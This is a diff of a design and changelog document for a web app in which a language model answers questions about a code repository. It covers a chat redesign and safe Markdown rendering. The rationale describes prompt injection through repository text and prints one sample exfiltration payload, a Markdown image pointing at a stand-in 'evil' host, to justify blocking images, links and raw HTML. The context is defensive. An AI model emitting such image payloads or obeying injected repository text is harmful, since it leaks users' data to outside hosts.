@@ -650,9 +650,8 @@ Worked example, with a scripted model (from `tests/web/test_web_ask.py`):
    shows "1 step done" and a row: `search_docs`, `query='install'`, 371 characters.
 4. Step 2: the model answers with three citations. The loop checks them:
    `README.md:3` and `lib/util.py:1` exist; `lib/gone.py:4` has no file.
-5. The state becomes done. `answer_parts` cuts the text at each citation (longest
-   first, so `a.py:12` is not cut at `a.py:1`). The template escapes every piece of
-   text, because model output is untrusted, and turns valid citations into links.
+5. The state becomes done. `render_answer` (since Nov 25; `answer_parts` before) formats the text and turns each
+   checked citation into a link. Nothing else of the model's becomes HTML.
 
 A snapshot id can hold a space (`Antidote graph-hacks@0ba557abfca8`). The citation
 pattern did not allow that, so every citation for such a repository was reported
@@ -663,17 +662,73 @@ and still finds citations of other snapshots so they can be reported.
 
 - Tests: `tests/web/test_web_ask.py` (8 tests): an answer with its steps and checked
   citations, escaping, an answer with no citations, a model that cannot be reached, an
-  empty and a too-long question, no key, read-only, a form from another website, and
-  `answer_parts`. Two more in `tests/agent/test_loop.py`: `on_step` per step, and a
+  empty and a too-long question, no key, read-only, a form from another website, Two more in `tests/agent/test_loop.py`: `on_step` per step, and a
   snapshot id with a space. No test calls a model or needs a key.
 - Not yet tried with a real model: the keys were not set on the machine this was built
   on. That is step 6c.
 - Known limits:
-  - The answer is shown as plain text: Markdown the model writes (`**bold**`, lists,
-    code fences) appears as written.
   - A citation whose path holds a space is not recognised.
   - No follow-up questions yet: each question starts a new conversation (decided after
     the real runs, step 6d).
-  - Questions are forgotten when the app stops; there is no cancel button.
+  - Questions are forgotten when the app stops; Stop is in the chat (Nov 25).
   - While a question runs, the model sees only this snapshot; there is no way to ask
     across repositories.
+
+## The redesign (Nov 25): black and blue, the side navigation, the chat
+
+The owner's asks, after using the app: less text, black with blue buttons, no green; on the
+start page only a repository's name and source, with the rest in a small square popup; a new
+navigation inside a repository; and Ask as a chat that opens on the right and narrows the page.
+
+### What
+
+- **Start page** (`snapshots.html`): an address box and the list. Clicking a row opens a 360 by
+  360 popup with commit, time, files, Open, Index again and Remove; Remove asks once more in a
+  popup of its own. The arrow at the end of a row opens the repository directly.
+- **Shell** (`base.html`): navigation on the left (Map, Search, Change impact, Coverage), search
+  and Ask on top, the chat on the right. Pages explain themselves in a `?` popup or a fold, not
+  in paragraphs.
+- **Chat** (`chat.html`, `_message.html`, `static/app.js`): the same questions as the Ask page,
+  with each step as it happens and a Stop button. It stays open while you move between pages,
+  and a citation opens the file next to it.
+- **Formatted answers** (`markdown.py`): headings, lists, tables and code, with each checked
+  citation as a short link such as `cleaner.py:588`.
+
+### Why
+
+- **Popups without JavaScript.** The browser's own popover (`popover`, `popovertarget`) opens,
+  centres and closes them, with Escape and a click outside for free.
+- **A little JavaScript, for the chat only.** A panel that keeps its place while it updates
+  needs it. `app.js` has no library and turns nothing of the model's into HTML: the server
+  renders each message, the script swaps in the ones that changed (so an opened detail stays
+  open) and asks again every 1.5 s while an answer is being made. Without JavaScript the Ask
+  button is a link to the Ask page, which works as before.
+- **The model's answer is untrusted.** It read a repository anyone may have written, which can
+  hold text meant to steer it. So `markdown.py` turns off raw HTML, links, images and automatic
+  links; only a citation that was checked becomes a link, and this code writes that link. Images
+  matter most: `![](https://evil/?q=...)` would send data out as soon as the page drew it.
+  Citations are swapped for marks before Markdown runs and for links after, because `a_b.py`
+  would otherwise become emphasis.
+- **A content security policy on every page** (`SECURITY_HEADERS`): scripts, styles and requests
+  only from the app itself. If something slipped past the escaping, it could still not run.
+- **Stop works between steps** (`Question.record_step` raises `Stopped`). A request already sent
+  to a model is waited for; a finished answer is never thrown away.
+- **One theme.** The light theme is gone: the owner asked for black. Amber is kept for warnings
+  and red for Remove, the two places a colour carries a meaning.
+
+### How it was checked
+
+A real browser (headless Edge) driven against the app with a scripted model: the popup measures
+360 by 360 and sits in the centre; the page narrows from 1228 to 828 pixels when the chat opens;
+an answer holding `<script>` shows it as text and adds no script tag; a citation opens the file
+with the chat still open; Stop ends a question; nothing overflows at 390 pixels wide; no script
+error and no policy violation.
+
+### Where
+
+- Tests: `tests/web/test_web_markdown.py` (formatting; eight ways an answer could carry HTML, a
+  link or an image; citations), and in `test_web_ask.py` the chat panel, its refusals, Stop, and
+  the policy on every page.
+- New dependency: `markdown-it-py` in the `web` extra (D-61, the owner's choice).
+- Known limits: each question is answered on its own, so a follow-up does not know the question
+  before it; Stop does not cut a wait for a rate limit short.
